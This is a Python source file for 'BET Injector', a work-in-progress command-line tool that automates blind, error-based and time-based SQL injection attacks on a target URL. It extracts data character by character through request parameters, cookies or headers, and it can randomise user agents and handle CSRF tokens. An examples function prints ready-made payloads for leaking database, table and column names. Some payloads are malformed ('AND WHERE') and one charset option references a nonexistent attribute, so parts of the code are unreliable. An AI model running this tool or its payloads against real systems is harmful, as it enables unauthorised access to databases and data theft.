import requests
import argparse
import sys
import string
import json
from fake_useragent import UserAgent
import time

# TODO: check usage_text
usage_text = '''
####
#
#
# BET Injector
# Made by: sandrulino
##########################################################################################################################
#
# Make your SQL injection attacks easier: Blind, Error, Time based supported.
# Step 1. Find a BET (Blind or Error or Time based) SQL Injection manually
# Step 2. Use this tool to perform the attack: use § as placeholder for the injection. You may read more infos in the README.md or via python3 main.py -h
# Step 3. Enjoy >:)
#
#
# This is one usage example:
# python3 main.py -u http://127.0.0.1:1234/login -r POST -p json -P "{\\"username\\":\\"admin\\", \\"password\\": \\"1' AND (SELECT 1 FROM INFORMATION_SCHEMA.schemata WHERE HEX(schema_name) LIKE '§%' LIMIT 1)='1\\"}" -rf error -i blind -al params
#
####
'''

##########################################################################################################################
# Stuff to color terminal output

class colors:
    GREEN = '\033[92m' # OK
    YELLOW = '\033[93m' # WARNING
    RED = '\033[91m' # FAIL
    BLUE = '\u001b[34m' # INFO
    RESET = '\033[0m' # RESET COLOR
    BOLD = "\033[1m" # BOLD

# TODO: check colored_print
def colored_print(my_string, text_color):
    print("[" + colors.BOLD + text_color + "BET Injector] " + colors.RESET + my_string)
    
##########################################################################################################################

# TODO: move this function in a different py file so user can edit that file and do not touch this main file
# Edit this to generate csrf token. You may use one of these templates
def generate_csrf_token():
    # Template 1: use an api
    '''
    return json.loads(session.get(http://127.0.0.1:1234/api/generate/csrf/token)['X-CSRFToken'])
    '''

    # Template 2: use a constant
    '''
    return "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    '''

    # Template 3: check a page with a csrf_token and take it
    '''
    return session.get(http://127.0.0.1:1234).text.split("'")[1];
    '''

    functionality_not_implemented_yet("generate csrf token")

# Notify the user that want to use generate_csrf_token that he needs to implement it
def functionality_not_implemented_yet(name):
    if name == "generate csrf token": # This is temporary
        colored_print("Please, edit generate_csrf_token function. This functionality needs to be implemented by the user", colors.RED)
    else:
        colored_print(colors.BOLD + colors.YELLOW + name + colors.RESET + " functionality is not implemented yet", colors.RED)
    exit(1)

# TODO: write a class to make injection_attack to make it more readable
# injection_attack logic should be good and working
def injection_attack(url, request_type, params_type, params, create_user, cookies, chars_payload, result_success, result_failure, time_injection, status_code_success, status_code_failure, headers, random_user_agent, injection_type, highlight_matches, attack_location, csrf_location, csrf_token_key, decode_encoding):
    found_words = []
    # List of words we're trying to brute force
    current_words = [""]  # Start with an empty word

    # (May) Create a temp session
    session = requests.session()
    if create_user: # If requested create an user on the spot
        # TODO: create an user on the spot overriding an empty session
        # import user_creator.py
        # session = user_creator.create_user(...)

        # create user is functionality not implemented yet
        functionality_not_implemented_yet("Create user")
    
    # If cookies in args exists override them
    if cookies is not None: 
        session.cookies.update(cookies)
    
    # If headers in args exists override them
    if headers is not None:
        session.headers.update(headers)

    # find the key which is the § in
    key = None

    # params means (data or json or params in future maybe other methods)
    # cookies & headers self-explanatory
    if attack_location == "params":
        for k in params.keys():
            if "§" in params[k]:
                key = k
                break
    elif attack_location == "cookies":
        for k in session.cookies.keys():
            if "§" in session.cookies[k]:
                key = k
                break
    elif attack_location == "headers":
        for k in session.headers.keys():
            if "§" in session.headers[k]:
                key = k
                break

    if key is None: # this should never happen. if this happen there's a bad input sanification. please consider to create an issue 
        colored_print("You must have one one § in the params || cookies || headers . This error should never occurred. It means there's a bad input sanification. Please consider to create an issue giving your argoments", colors.RED)
        exit(1)

    # an UserAgent object is needed to generate random user agents
    if random_user_agent:
        ua = UserAgent()

    # Attack logic -- should be all good and working
    while True:
        new_words = []
        for word in current_words:
            for char in chars_payload:
                test_word = word + char

                curr_params = params.copy() if params is not None else None
                curr_cookies = session.cookies.copy()
                curr_headers = session.headers.copy()
                if attack_location == "params":    
                    curr_params[key] = curr_params[key].replace("§",test_word)
                elif attack_location == "cookies":
                    curr_cookies.update({key: curr_cookies[key].replace("§",test_word)})
                elif attack_location == "headers":
                    curr_headers[key] = curr_headers[key].replace("§",test_word)

                # Random user agent
                if random_user_agent:
                    session.headers.update({"User-Agent": ua.random})

                # TODO: check 
                # dynamic crsf token
                if csrf_location == "params":
                    curr_params[csrf_token_key] = generate_csrf_token()
                elif csrf_location == "cookies":
                    session.cookies.update({csrf_token_key: generate_csrf_token()})
                elif csrf_location == "headers":
                    session.headers.update({csrf_token_key: generate_csrf_token()})
                elif csrf_location is not None:
                    colored_print("csrf_location is invalid. This error should never occurred. It means there's a bad input sanification. Please consider to create an issue giving your argoments", colors.RED)
                    exit(1)

                # Set the timer if its a time based injection
                timer = 0                
                if injection_type == "time":
                    timer = time.time()

                # Make the request with corrent request type and params type
                # If the request fail, try 4 more times otherwise exit
                for i in range(5):
                    try:
                        if request_type == "GET":
                            if params_type == "params":
                                response = session.get(url, params=curr_params, cookies=curr_cookies, headers=curr_headers)
                            else: # this should never happen. if this happen there's a bad input sanification. please consider to create an issue  
                                colored_print("If attack location is params, you need to have params. This error should never occurred. It means there's a bad input sanification. Please consider to create an issue giving your argoments", colors.RED)
                                exit(1)
                        elif request_type == "POST": # TODO: allow params, data, json at the same time
                            if params_type == "params":
                                response = session.post(url, params=curr_params, cookies=curr_cookies, headers=curr_headers)
                            elif params_type == "data":
                                response = session.post(url, data=curr_params, cookies=curr_cookies, headers=curr_headers)
                            elif params_type == "json":
                                response = session.post(url, json=curr_params, cookies=curr_cookies, headers=curr_headers)
                            elif attack_location != "params":
                                response = session.post(url, cookies=curr_cookies, headers=curr_headers)
                            else: # this should never happen. if this happen there's a bad input sanification. please consider to create an issue 
                                colored_print("If attack location is params, you need to have params . This error should never occurred. It means there's a bad input sanification. Please consider to create an issue giving your argoments", colors.RED)
                                exit(1)
                        else: # this should never happen. if this happen there's a bad input sanification. please consider to create an issue 
                            colored_print("You must choose between GET or POST. This error should never occurred. It means there's a bad input sanification. Please consider to create an issue giving your argoments", colors.RED)
                            exit(1)
                    except:
                        if i == 4:
                            colored_print("Error doing the request (5/5) times. Stopping . . .", colors.RED)
                            exit(1)
                        colored_print(f"Error doing the request, trying again in 2 seconds. . . ({i+1}/5)", colors.RED)
                        time.sleep(2)

                # debug purposes prints
                #print(response.text)

                # Let's see how the attack is going
                # TODO: check. should i keep these prints? should i put a "the script is running" print?
                if injection_type == "blind":
                    # Check if the result indicator is not none and is in the response
                    if result_success is not None and result_success in response.text:
                        colored_print(f"-rs Found match: {test_word}", colors.GREEN)
                        #colored_print(f"Found match: {test_word}", "BET Injector", colors.GREEN)
                        new_words.append(test_word)

                    # Check if the result indicator is not in the response
                    elif result_failure is not None and result_failure not in response.text:
                        colored_print(f"-rf Found match: {test_word}", colors.GREEN)
                        new_words.append(test_word)

                if injection_type == "error":
                    # Check if the status code is not none and is the same as the response
                    if status_code_success is not None and response.status_code == status_code_success:
                        colored_print(f"-scs Found match: {test_word}", colors.GREEN)
                        new_words.append(test_word)

                    # Check if the status code is not none and is the same as the response
                    elif status_code_failure is not None and response.status_code == status_code_failure:
                        colored_print(f"-scf Found match: {test_word}", colors.GREEN)
                        new_words.append(test_word)

                if injection_type == "time":
                    # Check if the time is greater than 1
                    if time.time() - timer > time_injection/1000:
                        colored_print(f"-t Found match: {test_word}", colors.GREEN)
                        new_words.append(test_word)

        # Exit condition: If we didn't find any new words, we're done
        if not new_words:
            break

        # TODO: check. should i put a print mid time?
        if highlight_matches:
            current_words = new_words
            found_words = {word for word in found_words if not any(new_word.startswith(word) for new_word in new_words)}
            found_words.update(new_words)
        else:
            # Update the current words and add the new words to the found words
            current_words = new_words
            found_words.extend(new_words)

    # TODO: check
    # Print the found words
    colored_print("Found words", colors.GREEN)
    for word in found_words:
        try:
            print("Hex may detected: " + word + f" -- {decode_encoding} decode: " + bytes.fromhex(word).decode(decode_encoding))
        except:
            print(word) 

##########################################################################################################################
# TODO: ALL THESE IS GONNA BE MOVED IN ANOTHER FILE FOR READING PURPOSES
# TODO: check
# maybe TODO: find a better way to ask args (number, name, functionality, etc)
def parse_args(parser):
    # url
    parser.add_argument("-u", "--url", help="URL to attack: http[s]://<domain>[:port][path]", required=True)
    # request type
    parser.add_argument("-r", "--request_type", help="Request type: GET || POST", required=True, choices=["GET", "POST"])
    # params_type: params, data, json, in future maybe html, xml
    parser.add_argument("-p", "--params_type", help="Params type: params || data || json", choices=["params", "data", "json"])
    # params: {"name": "value"}
    parser.add_argument("-P", "--params", help="Params as dictionary: {\"param1\": \"value1\", \"param2\": \"value2\"}")
    ###
    # create user yes or no, default is no
    #
    #                 /--> yes: given an url, an user will be created and session is used during the attack. but | is still done. this feature is TODO
    #                /                                                          /--------------------------------/ /--> yes: cookies are overrided
    # create_user -->                                                           |   /--> cookies ----------------->
    #                \                                                          v  /                               \------>\
    #                 \--> no: a session is created with no headers, no cookies --> (both checks are done)                  |--> no: nothing happens
    #                                                                              \                /--------------- ----->/
    #                                                                               \--> headers -->
    #                                                                                               \--> yes: headers are overrided
    #
    parser.add_argument("-cu", "--create_user", help="Create user", action='store_true')
    # cookies, default is none
    parser.add_argument("-c", "--cookies", help="cookies: cookie1=value1&cookie2=value2")
    # chars to use in the payload
    # hex is string.hexdigits
    # default is string.ascii_letters + string.digits
    # custom is the one you want
    # recommended string.ascii_letters + string.digits + string.punctuation + string.symbol
    # printable is all the printable characters string.printable
    parser.add_argument("-ch", "--chars_payload", help="Chars to use in the payload: <custom chars set> || hex || default || recommended || printable")
    # result success
    parser.add_argument("-rs", "--result_success", help="String to find in the page when the query is true: <custom string>")
    # result faiure
    parser.add_argument("-rf", "--result_failure", help="String to find in the page when the query is false: <custom string>")
    # time detect time based injection
    parser.add_argument("-t", "--time", help="Time in milliseconds to detect time based injection: <time>", type=int)
    # status code success
    parser.add_argument("-scs", "--status_code_success", help="Status code (int only) when the query is true: <status code>", type=int)
    # status code failure
    parser.add_argument("-scf", "--status_code_failure", help="Status code (int only) when the query is false: <status code>", type=int)
    # headers: {"header": "value"}
    parser.add_argument("-H", "--headers", help="Headers as dictionary: {\"header1\": \"value1\", \"header2\": \"value2\"}")
    # random user agent, default is no
    parser.add_argument("-rua", "--random_user_agent", help="Random user agent", action='store_true')
    # ask which type of injection: blind, error, time: blind uses -rf and -rf, error uses -scs and -scf, time uses -t
    parser.add_argument("-i", "--injection_type", help="Injection type: blind || error || time", required=True, choices=["blind", "error", "time"])
    # where is the query to perform the attack? use params, cookies or headers
    # TODO: change the name "params" could create confusion if the user wants to use for example json
    parser.add_argument("-al", "--attack_location", help="Attack location: params || cookies || headers ", required=True, choices=["params", "cookies", "headers"])
    # try to strip results. you may lose some results
    parser.add_argument("-hm", "--highlight_matches", help="The script tries to print important matches only", action='store_true')
    # TODO: not sure about this arg
    parser.add_argument("-e", "--examples", help="Shows few examples", action='store_true')
    # csrf token location could be in params, cookies or headers
    parser.add_argument("-cl", "--csrf_location", help="Dynamic CSRF token location", choices=["params", "cookies","headers"])
    # csrf key name could be anything
    parser.add_argument("-csrf", "--csrf_token_key", help="CSRF token key")
    # decode encoding
    parser.add_argument("-de", "--decode_encoding", help="If hex encoding is detected, the script tries to decode in utf-8 by default. You can use every encoding type listed here https://docs.python.org/3/library/codecs.html#standard-encodings")

# Logic should be good. Checks if -P are in args and valid. TODO: Prints are to improve and fix
def check_params(args):
    if args.params is None:
        return None
    try:
        return json.loads(args.params)
    except Exception as e:
        colored_print("-P --params are invalid: an error occured while reading params", colors.RED)
        exit(1)

# Logic should be good. Checks if -c are in args and valid. TODO: Prints are to improve and fix
def determine_cookies(cookies):
    if cookies is None:
        return None
    import urllib.parse
    try:
        return dict(urllib.parse.parse_qsl(cookies))
    except:
        colored_print("-c --cookies are invalid: an error occured while reading cookies", colors.RED)
        exit(1)

# Logic should be good. Checks if -ch are in args and valid. TODO: Prints are to improve and fix
def determine_chars_payload(args):
    chars_payload = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    if args.chars_payload is not None:
        if args.chars_payload == "hex":
            chars_payload = string.hexdigits
        elif args.chars_payload == "default":
            pass
        elif args.chars_payload == "recommended":
            chars_payload = string.ascii_letters + string.digits + string.punctuation + string.symbol
        elif args.chars_payload == "all":
            chars_payload = string.printable
        else:
            chars_payload = args.chars_payload
    colored_print(f"Chars payload: {chars_payload}", colors.BLUE)
    return chars_payload

# Logic should be good. Checks if -rs -rf are in args and valid. TODO: Prints are to improve and fix
def determine_result_strings(args):
    result_success = args.result_success if args.result_success is not None else None
    result_failure = args.result_failure if args.result_failure is not None else None
    if result_success:
        colored_print(f"Result success: {result_success}", colors.BLUE)
    if result_failure:
        colored_print(f"Result failure: {result_failure}", colors.BLUE)
    return result_success, result_failure

# Logic should be good. Checks if -t is in args and valid. TODO: Prints are to improve and fix
def validate_time(args):
    if args.time is not None and args.time <= 0:
        colored_print("-t --time is invalid: must be greater than 0", colors.RED)
        exit(1)

# Logic should be good. Checks if -scs -scf are in args and valid. TODO: Prints are to improve and fix
def determine_status_codes(args):
    status_code_success = args.status_code_success if args.status_code_success is not None else None
    status_code_failure = args.status_code_failure if args.status_code_failure is not None else None
    if status_code_success:
        colored_print(f"Status code success: {status_code_success}", colors.BLUE)
    if status_code_failure:
        colored_print(f"Status code failure: {status_code_failure}", colors.BLUE)
    return status_code_success, status_code_failure

# Logic should be good. Checks if -H are in args and valid. TODO: Prints are to improve and fix
def determine_headers(args):
    if args.headers is None:
        return None
    try:
        headers = json.loads(args.headers) if args.headers is not None else None
        colored_print(f"Headers: {args.headers}", colors.BLUE)
        return headers
    except:
        colored_print("-H --headers are invalid: an error occured while reading headers", colors.RED)
        exit(1)

# Logic should be good. Checks if params -rua in args and valid. TODO: Prints are to improve and fix
def determine_random_user_agent(args, headers):
    if args.random_user_agent:
        random_user_agent = True
        colored_print("Random user agent: yes", colors.BLUE)
    elif headers and headers.get("User-Agent") is not None:
        colored_print(f"Random user agent: no ({headers['User-Agent']} is used)", colors.BLUE)
        random_user_agent = False
    else:
        colored_print("Random user agent: no (python requests user agent is used)", colors.BLUE)
        random_user_agent = False

    if args.random_user_agent and headers and headers.get("User-Agent") is not None:
        colored_print("Warning random user agent used but headers ua passed. User agent will be overrided", colors.YELLOW)

    return random_user_agent

# Logic should be good. Checks if params -al in args and if the -P, -c or -H exists depending on -al type. TODO: Prints are to improve and fix
def determine_attack_location(args):
    if args.attack_location == "params":
        if args.params is None:
            colored_print("Params are invalid: With -al params You must have params", colors.RED)
            exit(1)
        if args.params.count("§") != 1:
            colored_print("Params are invalid: You must have one and only one § in the params", colors.RED)
            exit(1)
    if args.attack_location == "cookies":
        if args.cookies is None:
            colored_print("Cookies are invalid: With -al cookies You must have cookies", colors.RED)
            exit(1)
        if args.cookies.count("§") != 1:
            colored_print("Cookies are invalid: You must have one and only one § in the cookies", colors.RED)
            exit(1)
    if args.attack_location == "headers":
        if args.headers is None:
            colored_print("Headers are invalid: With -al headers You must have headers", colors.RED)
            exit(1)
        if args.headers.count("§") != 1:
            colored_print("Headers are invalid: You must have one and only one § in the headers", colors.RED)
            exit(1)

# Logic should be good. Checks if with the given args it is possible to detect the injection. TODO: Prints are to improve and fix
# A simple example is that you can't perform time attack without -t
def validate_injection_type_and_result_detection(injection_type, result_success, result_failure, status_code_success, status_code_failure, time):
    # Checks
    if (injection_type == "blind" and result_success is None and result_failure is None):
        colored_print("You can't perform the attack with blind based attack without a way to detect -rs || -rf", colors.RED)
        exit(1)
    if (injection_type == "error" and status_code_success is None and status_code_failure is None):
        colored_print("You can't perform the attack with error based attack without a way to detect -scs || -scf", colors.RED)
        exit(1)
    if injection_type == "time" and time is None:
        colored_print("You can't perform the attack with time injection attack without -t", colors.RED)
        exit(1)

def determine_csrf(args):
    #TODO: if you use one of -cl and -csrf you need both
    if args.csrf_location is not None and args.csrf_token_key is None:
        colored_print("If you use -cl You need to provide a -csrf", colors.RED)
        exit(1)
    if args.csrf_token_key is not None and args.csrf_location is None:
        colored_print("If you use -csrf You need to provide a -cl", colors.RED)
        exit(1)

def determine_decode_encoding(args):
    try:
        encoding = args.decode_encoding if args.decode_encoding else "utf-8"
        "".encode(encoding)  # Testing encoding
        return encoding
    except LookupError:
        colored_print("-de --decode_encoding looks invalid. Please provide one listed here https://docs.python.org/3/library/codecs.html#standard-encodings")
        exit(1)

##########################################################################################################################

# TODO: prints are to improve and fix
# TODO: each determine function needs to be change and have as parameter not args but the strict necessary
# TODO: decide if put all print inside each determine function to make main more clear OR all in main
# TODO: check if the order of sanification is logically right
def main():

    # TODO: remove this print
    print(colors.YELLOW+colors.BOLD+"BIG WARNING AND ALERT: THIS SCRIPT IS STILL UNDER DEVELOPMENT.\nIT MAY BE IN AN UNSTABLE VERSION. SOME FEATURES MAY BE BUGGY OR NOT IMPLEMENTED YET.\nVARIABLE AND FUNCTION NAMES MAY CHANGE IN FUTURE VERSIONS.\nTERMINAL OUTPUT MAY ALSO CHANGE. SOME COMMENTS MAY BE REMOVED OR MODIFIED IN FUTURE VERSIONS.\nTHE SCRIPT NAME BET Injector IS TEMPORARY AND WILL BE CHANGED IN THE FUTURE."+colors.RESET)

    parser = argparse.ArgumentParser(description=usage_text, formatter_class=argparse.RawTextHelpFormatter,)
    parse_args(parser)
    args = parser.parse_args()
    
    # TODO: probably temporary
    if args.examples:
        print_examples()
        exit(0)

    colored_print(f"Starting sql injection attack @ {args.url}", colors.BLUE)
    
    colored_print(f"Request type: {args.request_type}", colors.BLUE)
    colored_print(f"Params type: {args.params_type}", colors.BLUE)
    # Get and validate params (one and only one § and good dict)
    params = check_params(args)

    # by default, if you wanna params and you don't pass a params type (json / data / params), params is used
    if args.attack_location == "params" and args.params_type is None:
        colored_print("Warning -p --params_type is None: params is used", colors.YELLOW)
        args.params_type = "params"

    colored_print(f"Params: {params}", colors.BLUE)

    if args.create_user:
        colored_print("Creating user", colors.BLUE)

    cookies = determine_cookies(args.cookies)
    if cookies:
        colored_print(f"cookies: {args.cookies}", colors.BLUE)
        if args.create_user:
            colored_print("Warning both used, user will be created and cookies will be override", colors.YELLOW)

    chars_payload = determine_chars_payload(args)

    result_success, result_failure = determine_result_strings(args)

    validate_time(args)

    status_code_success, status_code_failure = determine_status_codes(args)

    validate_injection_type_and_result_detection(args.injection_type, result_success, result_failure, status_code_success, status_code_failure, args.time)

    headers = determine_headers(args)

    random_user_agent = determine_random_user_agent(args, headers)

    colored_print(f"Injection type: {args.injection_type}", colors.BLUE)

    colored_print(f"Highlight matches {args.highlight_matches}", colors.BLUE)

    determine_attack_location(args)

    determine_csrf(args)

    # TODO: another reminder of creating a class to improve readability, these are too many parameters
    injection_attack(args.url, args.request_type, args.params_type, params, args.create_user, cookies, chars_payload, result_success, result_failure, args.time, status_code_success, status_code_failure, headers, random_user_agent, args.injection_type, args.highlight_matches, args.attack_location, args.csrf_location, args.csrf_token_key, determine_decode_encoding())

# TODO: improve this function
def print_examples():
    colored_print("warning: these are examples. You should be aware of which injection and where the injection You are trying to do. Note: <this> means that you need to replace it depending on your case", colors.YELLOW)
    leak_database_names = "\n\t1' AND (SELECT 1 FROM INFORMATION_SCHEMA.schemata WHERE HEX(schema_name) LIKE '§%' LIMIT 1)='1"
    leak_table_names_1 = "\n\t1' AND (SELECT 1 FROM INFORMATION_SCHEMA.tables WHERE HEX(table_name) LIKE '§%' LIMIT 1)='1"
    leak_table_names_2 = "\n\t1' AND (SELECT 1 FROM INFORMATION_SCHEMA.tables WHERE HEX(table_name) LIKE '§%' AND WHERE table_schema = DATABASE() LIMIT 1)='1"
    leak_column_names = "\n\t1' AND (SELECT 1 FROM INFORMATION_SCHEMA.columns WHERE HEX(column_name) LIKE '§%' AND WHERE table_name = <table name> LIMIT 1)='1"
    leak_column_names = "\n\t1' AND (SELECT 1 FROM <table name> WHERE HEX(<column name>) LIKE '§%' LIMIT 1)='1"
    colored_print("Blind injection examples"+leak_database_names+leak_table_names_1+leak_table_names_2+leak_column_names, colors.BLUE)

    leak_database_names = "\n\t'1 AND (SELECT CASE WHEN EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.schemata WHERE HEX(schema_name) LIKE '§%') THEN 1 ELSE (SELECT table_name FROM INFORMATION_SCHEMA.TABLES) END)='1"
    leak_table_names_1 = "\n\t'1 AND (SELECT CASE WHEN EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.tables WHERE HEX(table_name) LIKE '§%') THEN 1 ELSE (SELECT table_name FROM INFORMATION_SCHEMA.TABLES) END)='1"
    leak_table_names_2 = "\n\t'1 AND (SELECT CASE WHEN EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.tables WHERE HEX(table_name) LIKE '§%' AND WHERE table_schema = DATABASE()) THEN 1 ELSE (SELECT table_name FROM INFORMATION_SCHEMA.TABLES) END)='1"
    leak_column_names = "\n\t'1 AND (SELECT CASE WHEN EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.columns WHERE HEX(column_name) LIKE '§%' AND WHERE table_name = <table name>) THEN 1 ELSE (SELECT table_name FROM INFORMATION_SCHEMA.TABLES) END)='1"
    leak_column_names = "\n\t'1 AND (SELECT CASE WHEN EXISTS (SELECT 1 FROM <table name> WHERE HEX(<column name>) LIKE '§%') THEN 1 ELSE (SELECT table_name FROM INFORMATION_SCHEMA.TABLES) END)='1"
    colored_print("Error injection examples"+leak_database_names+leak_table_names_1+leak_table_names_2+leak_column_names, colors.BLUE)

    leak_database_names = "\n\t1' AND (SELECT SLEEP(1) FROM INFORMATION_SCHEMA.schemata WHERE HEX(schema_name) LIKE '§%' LIMIT 1)='1"
    leak_table_names_1 = "\n\t1' AND (SELECT SLEEP(1) FROM INFORMATION_SCHEMA.tables WHERE HEX(table_name) LIKE '§%' LIMIT 1)='1"
    leak_table_names_2 = "\n\t1' AND (SELECT SLEEP(1) FROM INFORMATION_SCHEMA.tables WHERE HEX(table_name) LIKE '§%' AND WHERE table_schema = DATABASE() LIMIT 1)='1"
    leak_column_names = "\n\t1' AND (SELECT SLEEP(1) FROM INFORMATION_SCHEMA.columns WHERE HEX(column_name) LIKE '§%' AND WHERE table_name = <table name> LIMIT 1)='1"
    leak_column_names = "\n\t1' AND (SELECT SLEEP(1) FROM <table name> WHERE HEX(<column name>) LIKE '§%' LIMIT 1)='1"
    colored_print("Time injection examples"+leak_database_names+leak_table_names_1+leak_table_names_2+leak_column_names, colors.BLUE) 

if __name__ == "__main__":
    main()
else:
    colored_print("You must run this file as main file. Please run python3 main.py -h for more infos", colors.RED)
    exit(1)

'''
other TODO:
- If zero results found print (?): (print something?)
'''
